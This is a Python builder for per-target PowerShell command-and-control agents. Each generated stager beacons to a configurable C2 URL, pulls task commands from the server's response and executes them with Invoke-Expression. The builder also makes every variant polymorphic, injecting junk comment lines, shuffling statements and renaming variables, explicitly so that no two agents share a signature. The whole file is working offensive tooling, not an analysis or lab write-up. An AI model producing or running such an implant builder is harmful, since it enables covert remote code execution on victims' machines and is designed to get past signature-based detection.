"""Deterministic per-target OBSIDIAN agent variant builder for QUANTUM-CLI V4.

Builds a PowerShell stager variant for one target. The generated agent runs a
beacon loop against the C2 endpoint, sending a host/act heartbeat and running
any task command pulled from the response.

Determinism contract:
  * All randomness comes from ``random.Random(f'{target}:{epoch}')``, so the
    same (target, epoch) pair always produces a byte-identical file, while any
    change to target or epoch yields a byte-wise different agent.
  * No network calls, no hardcoded keys, no reliance on global RNG state.

Per-variant transformations (so no two compiled agents share a signature):
  * junk-line injection: 3-12 random comment lines between statements
  * shuffled statement order: independent preamble statements are reordered
  * random variable suffixes: every local variable is renamed ($buf -> $buf_3f9a)

Usage (standalone):
    python agents/build/variant.py --target 10.0.0.5

Usage (importable):
    from agents.build.variant import build_variant
    path = build_variant('10.0.0.5')
"""

from __future__ import annotations

import argparse
import hashlib
import random
import re
from pathlib import Path

DEFAULT_C2 = "http://127.0.0.1:8443/r"
DEFAULT_OUT_DIR = "agents/build/out"

_REPO_ROOT = Path(__file__).resolve().parents[2]

# Longest-first so the alternation never needs backtracking to match correctly.
_LOCAL_VARIABLES = ("resp", "body", "delay", "c2", "hid", "jit", "buf", "r")
_RENAME_RE = re.compile(r"\$(" + "|".join(_LOCAL_VARIABLES) + r")\b")

_JUNK_POOL = (
    "# routine maintenance marker",
    "# config sync point",
    "# see runbook section 4",
    "# keep interval within policy",
    "# legacy shim retained for compatibility",
    "# reviewed in last audit",
    "# do not reorder without approval",
    "# telemetry hook disabled",
    "# workaround for stale cache",
    "# schedule synced with controller",
    "# placeholder for future flags",
    "# node bootstrap notes",
    "# upstream patch pending",
    "# temp override cleared on boot",
    "# health probe configuration",
    "# suppress verbose output here",
    "# revision tracked out of band",
    "# defaults match golden config",
    "# no action required below this line",
    "# baseline captured before deploy",
    "# idle timeout handled upstream",
    "# local registry mirror preferred",
    "# quotas checked at start",
    "# fallback order intentional",
)


def _ps_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _preamble_blocks(c2: str, target: str, delay: int, jit: int) -> list:
    # These statements are mutually independent (referenced only at runtime,
    # from the main loop), so any order is valid and safe to shuffle.
    return [
        "$c2 = " + _ps_quote(c2),
        "$hid = " + _ps_quote(target),
        "$delay = " + str(delay),
        "$jit = " + str(jit),
        (
            "function Send-Hb {\n"
            "    $body = @{ host = $hid; act = 'hb' } | ConvertTo-Json -Compress\n"
            "    $r = Invoke-RestMethod -Uri $c2 -Method Post -Body $body"
            " -ContentType 'application/json'\n"
            "    $r\n"
            "}"
        ),
    ]


def _loop_blocks() -> list:
    # Ordered: the main loop must stay last (it never returns) and its body
    # statements depend on each other, so only junk is injected between them.
    return [
        "while ($true) {",
        "    $resp = $null",
        "    try { $resp = Send-Hb } catch { Start-Sleep -Milliseconds $delay; continue }",
        "    if (($null -ne $resp) -and $resp.task) {",
        "        $buf = [string]$resp.task",
        "        if ($buf.Length -gt 0) {",
        "            try { Invoke-Expression $buf | Out-Null } catch { }",
        "        }",
        "    }",
        "    Start-Sleep -Milliseconds ($delay + (Get-Random -Minimum 0 -Maximum ($jit + 1)))",
        "}",
    ]


def _junk_lines(rng: random.Random) -> list:
    count = rng.randint(3, 12)
    return list(rng.sample(_JUNK_POOL, count))


def _rename_variables(text: str, suffix: str) -> str:
    return _RENAME_RE.sub(lambda m: "$" + m.group(1) + "_" + suffix, text)


def build_variant(target, epoch=0, out_dir=None, c2=DEFAULT_C2) -> str:
    """Build one OBSIDIAN stager variant and return the written file path.

    Args:
        target: target identifier (host/IP) embedded in the agent heartbeat.
        epoch: variant epoch; same (target, epoch) is byte-identical, any
            different (target, epoch) is byte-wise different.
        out_dir: output directory. Defaults to <repo>/agents/build/out.
        c2: full beacon URL the agent loops against.

    Returns:
        str: path to the generated .ps1 file.
    """
    seed = f"{target}:{epoch}"
    rng = random.Random(seed)

    suffix = "".join(rng.choices("0123456789abcdef", k=4))
    delay = rng.randint(2000, 9000)
    jit = rng.randint(250, 1500)

    blocks = _preamble_blocks(c2, target, delay, jit)
    rng.shuffle(blocks)
    blocks.extend(_loop_blocks())

    lines = []
    for index, block in enumerate(blocks):
        if index:
            lines.extend(_junk_lines(rng))
        lines.append(block)
    script = _rename_variables("\n".join(lines) + "\n", suffix)

    out = Path(out_dir) if out_dir is not None else (_REPO_ROOT / DEFAULT_OUT_DIR)
    out.mkdir(parents=True, exist_ok=True)
    tag = hashlib.sha256(seed.encode("utf-8")).hexdigest()[:8]
    safe_target = re.sub(r"[^A-Za-z0-9.-]+", "_", target) or "host"
    path = out / f"obsidian_{safe_target}_e{epoch}_{tag}.ps1"
    path.write_bytes(script.encode("utf-8"))
    return str(path)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="variant.py",
        description="Deterministic per-target OBSIDIAN agent variant builder (QUANTUM-CLI V4).",
    )
    parser.add_argument(
        "--target",
        required=True,
        help="target identifier embedded in the agent (e.g. 10.0.0.5)",
    )
    parser.add_argument(
        "--epoch",
        type=int,
        default=0,
        help="variant epoch; different epochs produce different agents (default: 0)",
    )
    parser.add_argument(
        "--out-dir",
        default=DEFAULT_OUT_DIR,
        help="output directory (default: agents/build/out)",
    )
    parser.add_argument(
        "--c2",
        default=DEFAULT_C2,
        help="beacon URL the agent loops against (default: %(default)s)",
    )
    args = parser.parse_args(argv)

    path = build_variant(args.target, epoch=args.epoch, out_dir=args.out_dir, c2=args.c2)
    print(path)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
